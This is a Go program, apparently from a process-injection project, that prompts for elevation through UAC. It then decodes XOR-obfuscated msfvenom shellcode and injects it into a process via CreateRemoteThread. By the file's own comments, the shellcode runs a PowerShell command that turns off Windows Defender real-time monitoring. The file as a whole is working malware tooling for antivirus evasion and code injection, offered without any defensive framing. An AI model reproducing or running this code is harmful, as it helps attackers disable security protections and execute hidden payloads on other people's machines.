package main

import (
	"fmt"
	"go-procinject/utils"
	"golang.org/x/sys/windows"
	"os"
	"strings"
	"syscall"
)

// https://stackoverflow.com/questions/31558066/how-to-ask-for-administer-privileges-on-windows-with-go
func runMeElevated() {
	verb := "runas"
	exe, _ := os.Executable()
	cwd, _ := os.Getwd()
	args := strings.Join(os.Args[1:], " ")

	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
	argPtr, _ := syscall.UTF16PtrFromString(args)

	var showCmd int32 = 1 //SW_NORMAL

	err := windows.ShellExecute(0, verbPtr, exePtr, argPtr, cwdPtr, showCmd)
	if err != nil {
		fmt.Println(err)
	}
}

// https://stackoverflow.com/questions/31558066/how-to-ask-for-administer-privileges-on-windows-with-go
func amAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func main() {
	// Check if the current process has admin privs; if not prompt UAC
	// Admin is needed to disable AV
	if !amAdmin() {
		runMeElevated()
	}

	// Shellcode
	// msfvenom -p windows/exec CMD="powershell.exe Set-MpPreference -DisableRealtimeMonitoring \$true" -f csharp
	// XOR encrypted payload using 0xA2 as the key
	// Cipher chef from hex, xor, to hex (ox with comma)
	var xoredShellcode = []byte{0x5e, 0xea, 0x21, 0x46, 0x52, 0x4a, 0x62, 0xa2, 0xa2, 0xa2, 0xe3, 0xf3, 0xe3, 0xf2, 0xf0, 0xf3, 0xf4, 0xea, 0x93, 0x70, 0xc7, 0xea, 0x29, 0xf0, 0xc2, 0xea, 0x29, 0xf0, 0xba, 0xea, 0x29, 0xf0, 0x82, 0xea, 0x29, 0xd0, 0xf2, 0xea, 0xad, 0x15, 0xe8, 0xe8, 0xef, 0x93, 0x6b, 0xea, 0x93, 0x62, 0x0e, 0x9e, 0xc3, 0xde, 0xa0, 0x8e, 0x82, 0xe3, 0x63, 0x6b, 0xaf, 0xe3, 0xa3, 0x63, 0x40, 0x4f, 0xf0, 0xe3, 0xf3, 0xea, 0x29, 0xf0, 0x82, 0x29, 0xe0, 0x9e, 0xea, 0xa3, 0x72, 0x29, 0x22, 0x2a, 0xa2, 0xa2, 0xa2, 0xea, 0x27, 0x62, 0xd6, 0xc5, 0xea, 0xa3, 0x72, 0xf2, 0x29, 0xea, 0xba, 0xe6, 0x29, 0xe2, 0x82, 0xeb, 0xa3, 0x72, 0x41, 0xf4, 0xea, 0x5d, 0x6b, 0xe3, 0x29, 0x96, 0x2a, 0xea, 0xa3, 0x74, 0xef, 0x93, 0x6b, 0xea, 0x93, 0x62, 0x0e, 0xe3, 0x63, 0x6b, 0xaf, 0xe3, 0xa3, 0x63, 0x9a, 0x42, 0xd7, 0x53, 0xee, 0xa1, 0xee, 0x86, 0xaa, 0xe7, 0x9b, 0x73, 0xd7, 0x7a, 0xfa, 0xe6, 0x29, 0xe2, 0x86, 0xeb, 0xa3, 0x72, 0xc4, 0xe3, 0x29, 0xae, 0xea, 0xe6, 0x29, 0xe2, 0xbe, 0xeb, 0xa3, 0x72, 0xe3, 0x29, 0xa6, 0x2a, 0xea, 0xa3, 0x72, 0xe3, 0xfa, 0xe3, 0xfa, 0xfc, 0xfb, 0xf8, 0xe3, 0xfa, 0xe3, 0xfb, 0xe3, 0xf8, 0xea, 0x21, 0x4e, 0x82, 0xe3, 0xf0, 0x5d, 0x42, 0xfa, 0xe3, 0xfb, 0xf8, 0xea, 0x29, 0xb0, 0x4b, 0xf5, 0x5d, 0x5d, 0x5d, 0xff, 0xea, 0x18, 0xa3, 0xa2, 0xa2, 0xa2, 0xa2, 0xa2, 0xa2, 0xa2, 0xea, 0x2f, 0x2f, 0xa3, 0xa3, 0xa2, 0xa2, 0xe3, 0x18, 0x93, 0x29, 0xcd, 0x25, 0x5d, 0x77, 0x19, 0x52, 0x17, 0x00, 0xf4, 0xe3, 0x18, 0x04, 0x37, 0x1f, 0x3f, 0x5d, 0x77, 0xea, 0x21, 0x66, 0x8a, 0x9e, 0xa4, 0xde, 0xa8, 0x22, 0x59, 0x42, 0xd7, 0xa7, 0x19, 0xe5, 0xb1, 0xd0, 0xcd, 0xc8, 0xa2, 0xfb, 0xe3, 0x2b, 0x78, 0x5d, 0x77, 0xd2, 0xcd, 0xd5, 0xc7, 0xd0, 0xd1, 0xca, 0xc7, 0xce, 0xce, 0x8c, 0xc7, 0xda, 0xc7, 0x82, 0xf1, 0xc7, 0xd6, 0x8f, 0xef, 0xd2, 0xf2, 0xd0, 0xc7, 0xc4, 0xc7, 0xd0, 0xc7, 0xcc, 0xc1, 0xc7, 0x82, 0x8f, 0xe6, 0xcb, 0xd1, 0xc3, 0xc0, 0xce, 0xc7, 0xf0, 0xc7, 0xc3, 0xce, 0xd6, 0xcb, 0xcf, 0xc7, 0xef, 0xcd, 0xcc, 0xcb, 0xd6, 0xcd, 0xd0, 0xcb, 0xcc, 0xc5, 0x82, 0x86, 0xd6, 0xd0, 0xd7, 0xc7, 0xa2}
	var xorKey byte = 162
	// Decrypt the shellcode
	var shellcode []byte
	for i := 0; i < len(xoredShellcode); i++ {
		shellcode = append(shellcode, xoredShellcode[i]^xorKey)
	}
	// Inject the shell code into a process using the CreateRemoteThread Windows API function
	utils.CreateRemoteThread(shellcode)

}
